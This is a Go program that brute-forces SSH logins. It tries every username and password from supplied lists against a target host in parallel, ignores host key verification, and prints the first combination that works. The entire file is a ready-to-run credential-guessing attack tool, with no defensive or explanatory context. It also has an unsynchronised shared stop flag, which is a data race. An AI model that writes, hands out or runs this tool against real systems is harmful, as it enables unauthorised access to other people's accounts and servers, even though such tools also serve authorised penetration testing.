package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var rightUsername string = ""
var rightPassword string = ""

var mtx sync.Mutex
var stopped bool = false

func readLineByLine(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func bruteforce(host string, usernames *[]string, passwords *[]string) {
	var wg sync.WaitGroup

	for _, username := range *usernames {
		for _, password := range *passwords {
			if !stopped {
				wg.Add(1)
				go tryCombination(&wg, host, username, password)
			}
		}
	}

	wg.Wait()
}

func connect(host string, username string, password string) error {
	config := getConfig(username, password)
	conn, err := ssh.Dial("tcp", host, config)
	if err != nil {
		return err
	}

	conn.Close()
	return nil
}

func getConfig(username string, password string) *ssh.ClientConfig {
	return &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(2 * time.Second),
	}
}

func tryCombination(wg *sync.WaitGroup, host string, username string, password string) {
	defer wg.Done()

	if !stopped {
		if err := connect(host, username, password); err != nil {
			return
		}

		mtx.Lock()

		rightUsername = username
		rightPassword = password
		stopped = true

		mtx.Unlock()

	}
}

func main() {
	host := flag.String("host", "", "The target's address")
	user := flag.String("user", "", "A single username")
	userList := flag.String("user-list", "", "Path to a file containing a list of usernames")
	pass := flag.String("pass", "", "A single password")
	passList := flag.String("pass-list", "", "Path to a file containing a list of passwords")
	flag.Parse()

	if *host == "" {
		fmt.Println("Host is required")
		return
	}

	var usernames []string
	if *user != "" {
		usernames = append(usernames, *user)
	} else if *userList != "" {
		var err error
		usernames, err = readLineByLine(*userList)
		if err != nil {
			fmt.Printf("Error reading user list: %s\n", err)
			return
		}
	} else {
		fmt.Println("Either user or user-list is required")
		return
	}

	var passwords []string
	if *pass != "" {
		passwords = append(passwords, *pass)
	} else if *passList != "" {
		var err error
		passwords, err = readLineByLine(*passList)
		if err != nil {
			fmt.Printf("Error reading password list: %s\n", err)
			return
		}
	} else {
		fmt.Println("Either pass or pass-list is required")
		return
	}

	bruteforce(*host, &usernames, &passwords)

	if rightUsername == "" && rightPassword == "" {
		fmt.Println("Couldn't find username and password")
	} else {
		fmt.Printf("Combination found: [%s:%s]\n", rightUsername, rightPassword)
	}
}
